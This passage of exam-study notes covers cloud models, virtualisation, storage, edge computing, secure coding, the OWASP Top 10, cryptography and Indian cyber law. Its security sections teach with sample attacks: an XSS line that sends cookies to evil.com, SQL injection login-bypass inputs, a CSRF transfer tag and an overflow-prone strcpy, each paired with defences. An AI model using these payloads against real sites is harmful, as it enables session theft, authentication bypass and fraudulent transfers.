⭐ **Pizza analogy** (a standard teaching device):
- **On-premises** = make the pizza from scratch at home
- **IaaS** = buy a frozen pizza; you supply the oven, plates and dining table
- **PaaS** = order delivery; you supply the plates and table
- **SaaS** = eat at the restaurant; nothing is yours to manage

⭐⭐ **The guaranteed question: "who patches the guest operating system?"**
- ⭐ **IaaS → the CUSTOMER**
- ⭐ **PaaS and SaaS → the PROVIDER**

⚠ ⭐ **The most-tested consequence of IaaS:** you rent a virtual machine, so **OS patching, OS-level security and runtime installation are YOUR responsibility.** Many organisations get breached by forgetting this.

**Also:** **DaaS** (Desktop/Data), **STaaS** (Storage), **NaaS** (Network), **DBaaS** (Database), **XaaS** (anything as a service).

## 8.3 ⭐⭐ The four deployment models

| Model | 💡 Description | Use when |
|---|---|---|
| ⭐ **Public cloud** | Shared infrastructure owned and operated by a provider | ⭐ **Cheapest, most scalable, least control** |
| ⭐ **Private cloud** | Dedicated to **one organisation** (on- or off-premises) | ⭐ **Maximum control and security**, but highest cost and no elasticity benefit |
| ⭐ **Hybrid cloud** | Public + private, with orchestration between them | ⭐ **Keep sensitive data private while "bursting" to public capacity at peak** |
| ⭐ **Community cloud** | Shared by **several organisations with common concerns** | ⭐ Government departments, healthcare consortia, universities |
| **Multi-cloud** | Several public providers at once | Avoids vendor lock-in |

🔢 A bank keeping customer records in a **private** cloud (regulatory requirement) while running its public website in a **public** cloud → ⭐ **hybrid**.
🔢 Several state government departments sharing one cloud built to government security standards → ⭐ **community**.

## 8.4 ⭐ Benefits and drawbacks

⭐ **Benefits:**
- ⭐ **No capital expenditure** — CapEx becomes OpEx
- ⭐ **Elasticity and scalability** — handle a traffic spike, then scale back down
- Global reach — deploy near your users in minutes
- High availability and disaster recovery built in
- Automatic updates and patching (for PaaS/SaaS)
- Pay only for what you use

⚠ ⭐ **Drawbacks — these get asked as often as the benefits:**
- ⭐ **Dependence on internet connectivity** — no network, no application
- ⭐ **VENDOR LOCK-IN** — proprietary services make migration expensive
- ⭐ **Data security, privacy and SOVEREIGNTY** — your data physically sits in someone else's data centre, possibly in another country
- **Limited control and customisation**
- **Unpredictable cost at scale** — pay-per-use can exceed owning if usage is steady and heavy
- **Downtime is outside your control**
- Compliance and regulatory complexity

## 8.5 ⭐ Scaling and SLAs

📌 ⭐ **Vertical scaling (scale UP)** = make one machine bigger (more CPU/RAM). Simple, but there is a hardware ceiling and it usually needs a restart.
📌 ⭐ **Horizontal scaling (scale OUT)** = add more machines. ⭐ **This is what cloud elasticity means in practice**, and it needs a **load balancer** in front.

📌 ⭐ **SLA (Service Level Agreement)** — the contractual uptime/performance guarantee.

| Guarantee | Downtime per year |
|---|---|
| 99% ("two nines") | ~3.65 days |
| ⭐ **99.9% ("three nines")** | ⭐ **~8.77 hours** |
| 99.99% ("four nines") | ~52.6 minutes |
| ⭐ **99.999% ("five nines")** | ⭐ **~5.26 minutes** |

---

## 9. ⭐⭐ Virtualisation

### 💡 The idea

📌 **Virtualisation creates a software abstraction of physical resources** — so one physical server can appear as ten independent machines.

💡 **Why it is the enabling technology for cloud:** a provider cannot give every customer a dedicated physical machine. Virtualisation allows **resource pooling** (NIST characteristic 3) — many tenants safely isolated on shared hardware, each able to be created and destroyed in seconds.

## 9.1 ⭐⭐ Hypervisors

📌 A **hypervisor** (or Virtual Machine Monitor) is the software that creates and runs virtual machines.

| | ⭐ **Type-1 (bare-metal / native)** | ⭐ **Type-2 (hosted)** |
|---|---|---|
| ⭐ **Runs on** | ⭐ **The HARDWARE directly** | ⭐ **On top of a HOST OS** |
| Performance | ⭐ **Better** (no OS in the way) | Lower (extra layer) |
| ⭐ **Used for** | ⭐ **Data centres, production** | Desktop testing and development |
| ⭐ **Examples** | ⭐ **VMware ESXi, Microsoft Hyper-V, Xen, KVM** | ⭐ **VirtualBox, VMware Workstation/Player, Parallels** |

```
Type-1:                      Type-2:
┌────┬────┬────┐             ┌────┬────┐
│ VM │ VM │ VM │             │ VM │ VM │
├────┴────┴────┤             ├────┴────┤
│  HYPERVISOR  │             │Hypervisor│
├──────────────┤             ├──────────┤
│   HARDWARE   │             │  Host OS │
└──────────────┘             ├──────────┤
                             │ HARDWARE │
                             └──────────┘
```

**Types of virtualisation:** server · storage · network (⭐ **SDN**, **NFV**) · desktop (VDI) · application · data.

## 9.2 ⭐⭐⭐ Virtual machines vs containers

### 💡 The idea

A VM virtualises **hardware** — each VM boots a complete guest operating system. That is powerful isolation, but a full OS is gigabytes and takes a minute to boot, and you are running ten copies of the same kernel.

⭐ **A container virtualises the OPERATING SYSTEM instead.** All containers **share the host's kernel** and package only the application plus its libraries. The result is megabytes instead of gigabytes, and milliseconds instead of minutes.

```
Virtual Machines:                  Containers:
┌──────┬──────┬──────┐            ┌──────┬──────┬──────┐
│ App  │ App  │ App  │            │ App  │ App  │ App  │
│ Libs │ Libs │ Libs │            │ Libs │ Libs │ Libs │
│GuestOS│GuestOS│GuestOS│  ⭐      ├──────┴──────┴──────┤
├──────┴──────┴──────┤            │  Container Engine  │
│    Hypervisor      │            ├────────────────────┤
├────────────────────┤            │  ⭐ SHARED Host OS  │
│      Host OS       │            ├────────────────────┤
└────────────────────┘            └────────────────────┘
```

| | ⭐ **Virtual Machine** | ⭐ **Container** |
|---|---|---|
| ⭐ **Virtualises** | **Hardware** | ⭐ **The OPERATING SYSTEM** |
| ⭐ **Guest OS** | ⭐ **Each VM has its OWN full guest OS** | ⭐ **Shares the HOST KERNEL** |
| Size | **GB** | ⭐ **MB** |
| Boot time | Minutes | ⭐ **Seconds / milliseconds** |
| ⭐ **Isolation** | ⭐ **STRONGER (hardware-level)** | Weaker (process-level, shared kernel) |
| Density per host | Lower | ⭐ **Much higher** |
| Portability | Heavy images | ⭐ **Highly portable** |
| Technology | ESXi, KVM, Hyper-V | ⭐ **Docker**, containerd, LXC, Podman |

⚠⚠ ⭐ **Containers are LIGHTER and FASTER; VMs give STRONGER ISOLATION.** Both halves of that sentence get asked — do not assume containers are simply "better".

💡 **Why VMs isolate better:** a container escape only has to break out of a kernel namespace; a VM escape must break the hypervisor and the hardware virtualisation boundary. That is why untrusted multi-tenant workloads still often use VMs.

⭐ **Docker vocabulary:** **image** (an immutable template) → **container** (a running instance of an image) · **Dockerfile** (the build recipe) · **Docker Hub** (a public registry) · layered filesystem (layers are cached and shared).

⭐ **Kubernetes (K8s)** — container **ORCHESTRATION**: automated deployment, scaling, self-healing (restarting failed containers) and load balancing across a cluster.
📌 ⭐ **Kubernetes objects: POD (the smallest deployable unit — one or more containers)** · node · cluster · service · deployment · ReplicaSet · namespace.

---

## 10. ⭐⭐ Compute, network and storage management

## 10.1 Compute
Virtual machines/instances (families and sizing) · ⭐ **auto-scaling groups** (add/remove instances automatically based on load) · ⭐ **load balancing** (algorithms: round robin, least connections, IP hash; **layer-4** vs **layer-7** balancing) · containers and orchestration · serverless functions · GPU/HPC instances · pricing models (on-demand, reserved, **spot**).

## 10.2 ⭐⭐⭐ Storage types

### 💡 The idea — three fundamentally different ways to store bytes

| Type | ⭐ Unit | ⭐ How it is accessed | ⭐ Best for | Examples |
|---|---|---|---|---|
| ⭐ **Block storage** | Fixed-size **blocks** | Attached as a **raw volume**; the OS puts a filesystem on it | ⭐ **DATABASES, boot volumes, low-latency random I/O** | AWS EBS, SAN, iSCSI |
| ⭐ **File storage** | **Files** in a directory **hierarchy** | Network file protocols (**NFS, SMB**) | ⭐ **Shared file access**, home directories, legacy apps | AWS EFS, NAS |
| ⭐ **Object storage** | ⭐ **OBJECTS** (data + metadata + a unique ID) in a ⭐ **FLAT namespace** | ⭐ **HTTP / REST API** | ⭐ **Unstructured data, backups, media, static websites, data lakes** | ⭐ **AWS S3**, Azure Blob, Google Cloud Storage |

⭐⭐ **The three exam facts about object storage:**
1. ⭐ **It is FLAT** — there is no true directory hierarchy; "folders" are just name **prefixes**
2. ⭐ **It is accessed over HTTP/REST**, not mounted as a filesystem
3. ⭐ **It scales essentially without limit** and is the cheapest per GB

💡 **Why databases need BLOCK storage:** a database performs frequent small random reads and writes and needs to control its own layout and caching. Object storage can only replace a whole object at a time and is accessed over HTTP — hopeless for that pattern.

⭐ **Storage tiers:** hot → cool → cold → archive. ⭐ **Cheaper storage means higher retrieval cost and latency** (archive tiers may take hours to restore).

**Other concepts:** replication and durability ("eleven nines" = 99.999999999%) · snapshots · ⭐ **lifecycle policies** (auto-move objects to cheaper tiers after N days) · deduplication and compression · encryption at rest and in transit · ⭐ **CDN** (Content Delivery Network — caches static content at edge locations near users).

## 10.3 Network
**VPC (Virtual Private Cloud)** — your own isolated network in the provider's cloud · subnets · **security groups** (instance-level firewall) and **network ACLs** (subnet-level) · route tables · internet and NAT gateways · **VPN** and dedicated interconnects (AWS Direct Connect, Azure ExpressRoute) · elastic/floating IPs · managed DNS.

⭐ **SDN (Software-Defined Networking)** — 📌 **separates the CONTROL PLANE (decision-making) from the DATA PLANE (packet forwarding)**, and centralises the control plane in software. This makes the network **programmable** — you can reconfigure thousands of switches from one controller.
⭐ **NFV (Network Function Virtualisation)** — run firewalls, load balancers and routers as **software** on commodity servers instead of dedicated appliances.

## 10.4 Cloud migration and management

⭐ **The 6 R's of migration:**
1. ⭐ **Rehost** ("lift and shift") — move as-is to cloud VMs. Fastest, least benefit
2. **Replatform** — minor optimisations (e.g. move to a managed database)
3. **Refactor / re-architect** — rebuild cloud-natively. Most effort, most benefit
4. **Repurchase** — replace with a SaaS product
5. **Retire** — switch it off
6. **Retain** — leave it on-premises for now

**Management:** monitoring and logging · cost management / FinOps · ⭐ **IaC (Infrastructure as Code** — Terraform, CloudFormation: your infrastructure defined in version-controlled files) · **DevOps** and CI/CD.

## 10.5 ⭐⭐⭐ Edge computing

### 💡 The idea and the motivation

📌 ⭐ **Edge computing processes data CLOSE TO WHERE IT IS GENERATED**, instead of shipping everything to a central cloud.

💡 **Why it became necessary — two concrete drivers:**

🔢 **Latency.** A self-driving car's obstacle detection cannot tolerate a 100 ms round trip to a data centre 2000 km away — the car travels metres in that time. The decision must be made **in the vehicle**.

🔢 **Bandwidth.** A factory with 1000 sensors sampling 100 times a second generates far more data than its internet link can carry. Process locally, and send only **summaries and anomalies** upstream.

⭐ **The four motivations:** ⭐ **reduced latency** · ⭐ **reduced backhaul bandwidth cost** · **data privacy/sovereignty** (raw data never leaves the site) · **resilience** to intermittent connectivity.

### ⭐⭐ Cloud vs Fog vs Edge

| | ⭐ **Cloud** | ⭐ **Fog** | ⭐ **Edge** |
|---|---|---|---|
| ⭐ **Location** | Centralised **data centres** | ⭐ **An INTERMEDIATE layer — LAN, gateways, local routers** | ⭐ **ON or NEXT TO the device itself** |
| ⭐ **Latency** | ⭐ **Highest** | Medium | ⭐ **LOWEST** |
| Compute power | ⭐ **Highest** | Medium | ⭐ **Limited** |
| Data retained | Long-term | Short-term | Transient |
| Coverage | Global | Regional/site | Device |

⭐ Remember the ordering both ways: **latency Cloud > Fog > Edge**, but **compute power Cloud > Fog > Edge** as well. Edge trades power for proximity.

**Use cases:** autonomous vehicles · industrial IoT and predictive maintenance · smart cities and traffic control · AR/VR · video analytics and CCTV · healthcare monitoring · smart retail.
Related: ⭐ **MEC (Multi-access Edge Computing)** — edge compute built into 5G base stations.

## 10.6 ⭐ Indian government cloud context

⭐ **MeghRaj** — the Government of India Cloud initiative (MeitY). ⭐ **NIC National Cloud** provides GI Cloud services to central and state government departments.
**MeitY-empanelled cloud service providers** · **data localisation** requirements · ⭐ **State Data Centres (SDC)** and ⭐ **SWAN (State Wide Area Network)** under the National e-Governance Plan.

⭐ *Directly relevant to the Directorate of Information Technology's own work — and a plausible interview topic.*

---

# PART C — CYBER SECURITY & EMERGING TECHNOLOGIES

## 11. ⭐⭐ Secure programming techniques

### 💡 The core insight

📌 ⭐ **Almost every serious vulnerability comes from the same root cause: TRUSTING INPUT THAT SHOULD NOT BE TRUSTED**, and letting **data** be interpreted as **code**.

SQL injection, XSS, command injection, buffer overflow — all are variants of that one mistake.

## 11.1 ⭐ The principles

| Principle | 💡 Meaning |
|---|---|
| ⭐ **Input validation** | Never trust user input. ⭐ **Validate on the SERVER side** (client-side checks are trivially bypassed) and prefer **ALLOW-lists** over deny-lists |
| ⭐ **Output encoding** | Encode data for the **context it is going into** (HTML, JavaScript, SQL, URL). ⭐ **This is the real defence against XSS** |
| ⭐ **Least privilege** | Every component gets the **minimum** rights it needs — a web app's DB user should not be able to `DROP TABLE` |
| ⭐ **Defence in depth** | Multiple independent layers, so one failure is not fatal |
| ⭐ **Fail securely / secure defaults** | On error, **deny**. Ship with security switched **on** |
| **Complete mediation** | Check authorisation on **every** access, not just the first |
| ⭐ **Open design** | Security must not depend on the design being secret — ⭐ **"no security through obscurity"** |
| **Separation of duties** | Split critical actions between two actors |
| **Economy of mechanism** | Keep security logic simple enough to audit |

💡 **Why allow-lists beat deny-lists:** a deny-list must anticipate every possible attack string, and attackers keep inventing new ones. An allow-list defines exactly what is acceptable and rejects everything else — including attacks nobody has thought of yet.

## 11.2 ⭐ Common vulnerability classes

⭐ **Buffer overflow** — writing past the end of a buffer, overwriting adjacent memory (potentially the **return address**), so the attacker's data becomes executed **code**.
```c
char buf[10];
strcpy(buf, user_input);   // ❌ no bounds check — overflow if input > 9 chars
```
⭐ **Mitigations:** bounds checking; safe functions (`strncpy` over `strcpy`); ⭐ **ASLR** (Address Space Layout Randomisation) · ⭐ **DEP/NX** (mark the stack non-executable) · **stack canaries** (a guard value that detects overwriting); use memory-safe languages.

⭐ **Integer overflow/underflow** — an arithmetic result wraps around, often defeating a size check.
⭐ **Race conditions / TOCTOU** (Time-Of-Check to Time-Of-Use) — the state changes between validation and use.
**Format string vulnerabilities** — `printf(user_input)` lets the attacker read and write memory.
**Hardcoded credentials · verbose error messages · insecure deserialisation · use-after-free · memory leaks.**

## 11.3 ⭐ Secure SDLC

⭐ **Threat modelling (STRIDE:** Spoofing, Tampering, Repudiation, Information disclosure, Denial of service, Elevation of privilege) · secure design review · ⭐ **SAST** (static analysis — scans source code) and ⭐ **DAST** (dynamic analysis — tests the running app) · **SCA** (dependency/software-composition scanning) · code review · penetration testing.

📌 ⭐ **"Shift left"** — find security defects **early** in the lifecycle, because the cost of fixing a defect rises steeply the later it is found (the same principle as software engineering's defect-cost curve in Week 11).

---

## 12. ⭐⭐⭐ OWASP Top 10

📌 ⭐ **OWASP = Open Worldwide Application Security Project** — a non-profit that publishes the most widely cited list of web-application security risks, revised every few years from real-world breach data.

⭐ **The Top 10 (2021 edition) — learn all ten by name and one-line meaning:**

| Rank | ⭐ Category | 💡 One-line meaning |
|---|---|---|
| ⭐ **A01** | ⭐ **Broken Access Control** | Users can act **outside their permissions** — IDOR (changing `/order/123` to `/order/124`), privilege escalation, missing function-level checks |
| **A02** | **Cryptographic Failures** | Sensitive data exposed through weak or absent encryption *(formerly "Sensitive Data Exposure")* |
| ⭐ **A03** | ⭐ **Injection** | Untrusted input interpreted as **code or a query** — ⭐ **SQL injection, XSS, command injection, LDAP injection** |
| **A04** | **Insecure Design** | Missing or ineffective security controls **by design** *(new in 2021)* |
| **A05** | **Security Misconfiguration** | Default credentials, unnecessary features enabled, verbose errors, missing hardening *(absorbed XXE)* |
| **A06** | **Vulnerable and Outdated Components** | Unpatched libraries and dependencies |
| **A07** | **Identification and Authentication Failures** | Weak passwords, broken session management, credential stuffing |
| **A08** | **Software and Data Integrity Failures** | Unverified updates, insecure deserialisation, CI/CD pipeline compromise |
| **A09** | **Security Logging and Monitoring Failures** | Breaches go undetected for months |
| **A10** | **Server-Side Request Forgery (SSRF)** | The **server** is tricked into making requests to unintended internal destinations |

⭐ **Key changes in the 2021 revision:**
- ⭐ **Broken Access Control rose to #1** (it was #5)
- ⭐ **Injection FELL from #1 to #3**, and **absorbed XSS** as a subcategory
- Three new categories: **Insecure Design**, **Software & Data Integrity Failures**, **SSRF**

⚠ ⭐ **OWASP revises the list periodically.** If a question names an edition, answer for that edition. Useful history: **Injection was #1 in the 2013 and 2017 editions**; **Broken Access Control was #1 in 2021**.

## 12.1 ⭐⭐⭐ SQL Injection

### 💡 How it works

The application builds a SQL query by **string concatenation**, so user input becomes part of the query's **code**, not just its data.

```sql
-- Vulnerable code:
query = "SELECT * FROM users WHERE name = '" + input + "'"

-- Normal input:  Amit
SELECT * FROM users WHERE name = 'Amit'

-- ⭐ Attack input:  ' OR '1'='1
SELECT * FROM users WHERE name = '' OR '1'='1'
                                      ↑ always TRUE → returns EVERY row
```

🔢 **Worse — a login bypass.** Input `admin' --` into the username field:
```sql
SELECT * FROM users WHERE name = 'admin' --' AND password = '...'
                                          ↑ the rest is COMMENTED OUT
```
⭐ The password check disappears entirely.

### ⭐⭐ The defences, ranked

| Defence | ⭐ Effectiveness |
|---|---|
| ⭐ **Parameterised queries / prepared statements** | ⭐⭐ **THE fix** — see below |
| Stored procedures (written safely) | Good |
| Input validation / allow-listing | Useful **defence in depth** |
| Least-privilege database accounts | Limits the **damage**, does not prevent the attack |
| Escaping input | Fragile; a last resort |
| Hiding error messages | ⚠ ⭐ **NOT a fix** — it only hides the symptom and slows the attacker down |

### 💡⭐ Why parameterised queries actually solve it

```python
# ✅ SAFE
cursor.execute("SELECT * FROM users WHERE name = ?", (user_input,))
```
⭐ The query **structure is sent to the database FIRST and compiled**. The parameter is then supplied **separately, as pure data**. The database has already decided what the query means, so no amount of SQL syntax in the input can change it.

⭐ **This is the same insight as output encoding: keep CODE and DATA in separate channels.**

## 12.2 ⭐⭐⭐ Cross-Site Scripting (XSS)

### 💡 How it works

The application echoes user input into a page **without encoding it**, so the attacker's `<script>` runs **in another user's browser**, in the trusted site's context.

```html
<!-- A comment field, echoed unencoded: -->
<p>Amit says: <script>fetch('http://evil.com?c='+document.cookie)</script></p>
```
⭐ Every visitor who views that comment silently sends their **session cookie** to the attacker.

### ⭐ The three types

| Type | 💡 How the payload arrives | Severity |
|---|---|---|
| ⭐ **Stored (persistent)** | Saved **on the server** (a comment, profile field) and served to ⭐ **every viewer** | ⭐ **Most damaging** |
| ⭐ **Reflected** | Comes in the **request** and is echoed straight back — delivered via a **crafted link** | Needs the victim to click |
| ⭐ **DOM-based** | Client-side JavaScript writes untrusted data into the DOM; the server never sees the payload | Hard to detect server-side |

### ⭐ Defences
⭐ **Output encoding for the correct context** (the primary fix) · input validation · ⭐ **Content Security Policy (CSP)** — tells the browser which script sources are allowed · ⭐ **`HttpOnly` cookie flag** (makes cookies invisible to JavaScript, blocking cookie theft) and `Secure` flag · sanitisation libraries · avoid `innerHTML` and `eval`.

⚠⚠ ⭐ **XSS attacks the USER'S BROWSER; SQL injection attacks the DATABASE.** Do not confuse them.

## 12.3 ⭐ CSRF (Cross-Site Request Forgery)

### 💡 How it works

You are logged into your bank. You visit a malicious page containing:
```html
<img src="https://bank.com/transfer?to=attacker&amount=50000">
```
⭐ Your browser **automatically attaches your bank cookies** to that request (§1.3 — cookies go with *every* request to that domain). The bank sees a properly authenticated transfer request.

⭐ **Defences:** ⭐ **anti-CSRF tokens** (a secret value in each form that the attacker's page cannot know) · ⭐ **`SameSite` cookie attribute** · checking the `Origin`/`Referer` header.

⚠⚠ ⭐ **XSS vs CSRF — the classic contrast:**
- ⭐ **XSS** exploits the **site's trust in USER INPUT** (the site serves the attacker's script)
- ⭐ **CSRF** exploits the **site's trust in an AUTHENTICATED USER'S BROWSER** (the browser sends the attacker's request with valid credentials)

---

## 13. ⭐⭐⭐ Cryptography and security controls

## 13.1 ⭐⭐⭐ Symmetric vs asymmetric

### 💡 The idea

⭐ **Symmetric encryption** uses **one shared secret key** for both encrypting and decrypting. Fast and simple — but how do you get the key to the other party securely in the first place? (You cannot encrypt it without a key.) ⭐ **That is the KEY DISTRIBUTION PROBLEM**, and it stumped cryptography for two thousand years.

⭐ **Asymmetric (public-key) encryption** solves it with a **mathematically linked key PAIR**: a **public** key you publish freely, and a **private** key you never share. Anything encrypted with the public key can only be decrypted with the private key.

```
Symmetric:   Alice ──[same key K]──► Bob        How does K get there safely?

Asymmetric:  Alice encrypts with Bob's PUBLIC key  ──► only Bob's PRIVATE key opens it
             (Bob's public key can be printed in a newspaper)
```

| | ⭐ **Symmetric** | ⭐ **Asymmetric (public key)** |
|---|---|---|
| ⭐ **Keys** | ⭐ **ONE shared secret** | ⭐ **A public/private PAIR** |
| ⭐ **Speed** | ⭐ **Fast** | ⭐ **Slow** (~1000× slower) |
| ⭐ **Key distribution** | ⭐ **THE hard problem** | ⭐ **SOLVED** |
| ⭐ **Keys needed for n users** | ⭐ **n(n−1)/2** | ⭐ **2n** |
| ⭐ **Algorithms** | ⭐ **AES, DES, 3DES, Blowfish, RC4, ChaCha20** | ⭐ **RSA, ECC, Diffie–Hellman, DSA, ElGamal** |
| Provides | Confidentiality | Confidentiality, ⭐ **digital signatures, NON-REPUDIATION** |

### 🔢 The key-count comparison

**100 users who all need to communicate securely:**
- ⭐ **Symmetric:** 100 × 99 / 2 = **4950** keys, every one of which must be distributed secretly
- ⭐ **Asymmetric:** 2 × 100 = **200** keys, and half of them are **public** (no secrecy needed)

⭐ **That scaling difference is why public-key cryptography made secure internet commerce possible.**

### ⭐⭐ Hybrid cryptosystems — why HTTPS uses both

⚠ ⭐ **A guaranteed question: "why does TLS/HTTPS use both symmetric and asymmetric cryptography?"**

⭐ **Answer: because each solves the other's problem.**
1. ⭐ **Asymmetric** is used at the start, to **exchange a random SESSION KEY** — solving key distribution
2. ⭐ **Symmetric** (with that session key) then encrypts the **bulk data** — because asymmetric is far too slow for megabytes

**Algorithm specifics:**
- **DES:** 64-bit block, ⭐ **56-bit effective key** — broken by brute force
- **3DES:** 168-bit key; slow
- ⭐ **AES:** 128-bit block with 128/192/256-bit keys — ⭐ **the current standard**
- ⭐ **RSA:** based on the difficulty of ⭐ **FACTORING large integers**
- ⭐ **ECC:** based on the elliptic-curve discrete logarithm problem — ⭐ **equivalent security with much smaller keys** (hence popular on mobile)
- ⭐ **Diffie–Hellman:** ⭐ **key EXCHANGE only, not encryption**

## 13.2 ⭐⭐ Hashing

### 💡 The idea

📌 A **cryptographic hash** is a **one-way** function producing a fixed-size **digest** from any input.

```
"hello"          → SHA-256 → 2cf24dba5fb0a30e...  (256 bits)
"hello world"    → SHA-256 → b94d27b9934d3e08...  (256 bits, totally different)
a 10 GB file     → SHA-256 → (still 256 bits)
```

⭐ **Required properties:**
- **Deterministic** — same input always gives the same digest
- Fast to compute
- ⭐ **Pre-image resistance** — given a digest, you cannot find an input that produces it (one-way)
- ⭐ **Collision resistance** — you cannot find two inputs with the same digest
- ⭐ **Avalanche effect** — changing **one input bit** flips about **half** the output bits

| Algorithm | Digest | ⭐ Status |
|---|---|---|
| **MD5** | 128 bits | ⭐ **BROKEN** (practical collisions) |
| **SHA-1** | 160 bits | ⭐ **BROKEN / deprecated** |
| ⭐ **SHA-256 (SHA-2 family)** | 256+ bits | ⭐ **Current standard** |
| **SHA-3** | Variable | Standard (different internal design) |
| ⭐ **bcrypt, scrypt, Argon2, PBKDF2** | — | ⭐ **For PASSWORD storage** — deliberately **slow** and salted |

⚠⚠ ⭐ **NEVER store passwords with a plain fast hash.** A modern GPU computes billions of SHA-256 hashes per second, so a leaked table of SHA-256 password hashes is cracked in hours.

⭐ **The correct approach:**
- ⭐ **SALT** — a unique random value per password, stored alongside it. ⭐ **This defeats rainbow tables** (precomputed hash lookups), because the attacker must now attack each password separately rather than all at once.
- ⭐ **A slow key-derivation function** (bcrypt/Argon2) — deliberately expensive, so brute force becomes infeasible.
- **PEPPER** — a secret site-wide value, kept outside the database.

⚠⚠ ⭐ **Three things that are NOT the same:**
- ⭐ **Hashing** — one-way, **irreversible**, fixed output size
- ⭐ **Encryption** — **reversible** with the right key
- ⭐ **Encoding** (Base64) — **not security at all**, just a representation change, trivially reversed

## 13.3 ⭐⭐⭐ Digital signatures and PKI

### 💡 The idea

Encryption gives **confidentiality**. A **digital signature** gives something different: proof of **who sent it** and that it **has not been altered**.

⭐ **How signing works:**
1. **Hash** the message
2. ⭐ **Encrypt that hash with the SENDER'S PRIVATE key** → this is the signature
3. Send the message plus the signature

⭐ **How verification works:**
1. **Decrypt the signature with the SENDER'S PUBLIC key** → recovers the original hash
2. **Independently hash** the received message
3. If the two hashes **match**, the signature is valid

📌 ⭐ **A digital signature provides: AUTHENTICATION + INTEGRITY + NON-REPUDIATION.**
⚠ ⭐ **It does NOT provide CONFIDENTIALITY** — the message itself is sent in the clear. (For both, you sign *and* encrypt.)

💡 **Why it gives non-repudiation:** only the holder of the private key could have produced a signature that the matching public key verifies. The sender cannot later deny having sent it.

### ⚠⚠⭐ The direction — asked constantly

📌 ⭐ **SIGNING for authenticity → use the SENDER'S PRIVATE key**
📌 ⭐ **ENCRYPTING for confidentiality → use the RECEIVER'S PUBLIC key**

💡 **The logic, which makes it memorable:**
- Only **one person** has the sender's private key → so a signature it produces proves **identity**
- **Everyone** has the receiver's public key → so anyone can *send* the receiver a secret, but only the receiver can *read* it

⭐ **PKI (Public Key Infrastructure):** the system that makes public keys trustworthy. A ⭐ **Certificate Authority (CA)** issues ⭐ **X.509 digital certificates** binding an identity to a public key. Plus a Registration Authority, **CRL/OCSP** for revocation, and a **chain of trust** up to a root CA pre-installed in your browser.

⭐ **SSL/TLS:** the TLS handshake authenticates the server via its **certificate**, negotiates a cipher suite, and establishes a **symmetric session key** (the hybrid scheme of §13.1). ⭐ **HTTPS = HTTP over TLS, port 443.**

## 13.4 ⭐⭐ The CIA triad and attacks

📌 ⭐ **The three security objectives — the CIA triad:**

| Objective | 💡 Meaning | Threatened by |
|---|---|---|
| ⭐ **Confidentiality** | Only authorised parties can read it | Eavesdropping, data theft |
| ⭐ **Integrity** | Data has not been altered | Tampering, MITM |
| ⭐ **Availability** | The service is usable when needed | ⭐ **DoS/DDoS**, ransomware |

*(Extended with: Authentication, Authorisation, Non-repudiation, Accountability.)*

### ⭐ Attacks

| Attack | 💡 Description | ⭐ Primary target |
|---|---|---|
| ⭐ **DoS / DDoS** | Flood the target to exhaust its resources. ⭐ **DDoS uses a BOTNET of compromised machines** | ⭐ **AVAILABILITY** |
| ⭐ **Phishing** / spear phishing / vishing | **Social engineering** to steal credentials — attacks the *human*, not the software | Confidentiality |
| ⭐ **Man-in-the-Middle (MITM)** | Intercept and possibly alter traffic between two parties | Confidentiality, integrity |
| ⭐ **Ransomware** | Encrypts the victim's data and demands payment | Availability |
| **Malware** | See the virus/worm distinction below | Various |
| **Password attacks** | Brute force · dictionary · ⭐ **rainbow tables** (defeated by salting) · credential stuffing | |
| **Privilege escalation** | **Vertical** (gain higher rights) / **horizontal** (access a peer's data) | |
| **Zero-day** | Exploits a vulnerability with no patch available yet | |
| **Replay attack** | Re-sends captured valid data (defence: **nonces**, timestamps) | |
| **Insider threat** | A trusted person misusing access | |

⚠⚠ ⭐ **Virus vs worm — a standard question:**
- ⭐ A **VIRUS** needs a **host file** and usually a user action to spread
- ⭐ A **WORM** is ⭐ **SELF-REPLICATING** and spreads across networks **by itself**, with no user action

Others: **trojan** (disguised as legitimate software) · **spyware** · **rootkit** (hides itself at OS level) · **logic bomb** (triggers on a condition) · **botnet**.

### ⭐⭐ Defensive controls

| Control | 💡 Function |
|---|---|
| ⭐ **Firewall** | Filters traffic by rules. ⭐ **Packet filter** (stateless, L3/L4) · ⭐ **stateful inspection** (tracks connections) · **application/proxy** firewall · **NGFW**. ⭐ **WAF** protects web apps specifically (SQLi/XSS) |
| ⭐⭐ **IDS vs IPS** | ⭐ **IDS DETECTS and ALERTS (passive, out-of-band); IPS DETECTS and BLOCKS (active, INLINE)** |
| **VPN** | An **encrypted tunnel** over a public network (IPsec, SSL/TLS) |
| **Antivirus / EDR** | Signature- and behaviour-based malware defence |
| **DMZ** | A screened subnet for public-facing servers, isolated from the internal network |
| ⭐ **MFA / 2FA** | ⭐ **Two or more of: something you KNOW (password), something you HAVE (phone/token), something you ARE (biometric)** |
| **SIEM** | Centralised log collection and correlation |
| **Honeypot** | A decoy system to detect and study attackers |
| Sandboxing · air gap · RBAC · DLP | |

⚠ ⭐ **IDS ALERTS; IPS BLOCKS.** A one-word difference worth a full mark.

## 13.5 ⭐ Indian cyber law and institutions

⭐ **IT Act, 2000** (amended 2008) — India's primary cyber law. It gave legal recognition to **electronic records** and **digital/electronic signatures**.

⭐ **Key sections worth knowing:**

| Section | Subject |
|---|---|
| ⭐ **43** | Damage to computer systems (civil liability, compensation) |
| **43A** | Compensation for failure to protect sensitive personal data |
| **65** | Tampering with computer source documents |
| ⭐ **66** | Computer-related offences (dishonestly/fraudulently) |
| ⭐ **66C** | **Identity theft** |
| ⭐ **66D** | **Cheating by personation** using a computer resource |
| **66E** | Violation of privacy |
| ⭐ **66F** | **Cyber terrorism** |
| **67** | Publishing obscene material in electronic form |
| ⭐ **69** | Powers of interception, monitoring and decryption |
| **70** | Protected systems |
| **72** | Breach of confidentiality and privacy |

⭐ **DPDP Act, 2023** — the Digital Personal Data Protection Act. Introduces **data fiduciary** and **data principal**, consent requirements, purpose limitation, and a **Data Protection Board**.
⭐ **CERT-In** — the Indian Computer Emergency Response Team; the **national nodal agency** for cyber incidents, with **mandatory 6-hour incident reporting**.
Also: ⭐ **NCIIPC** (critical information infrastructure protection) · **Cyber Swachhta Kendra** (botnet cleaning) · ⭐ **I4C** (Indian Cyber Crime Coordination Centre) · **National Cyber Security Policy 2013**.

---

## 14. ⭐⭐ IoT (Internet of Things)

### 💡 The idea

📌 ⭐ **IoT is a network of physical objects embedded with sensors, software and connectivity, collecting and exchanging data.**

💡 **The shift it represents:** the internet used to connect *people* (via computers and phones). IoT connects *things* — a soil-moisture sensor, a streetlight, a shipping container, a pacemaker — so that decisions can be made from real-world data automatically.

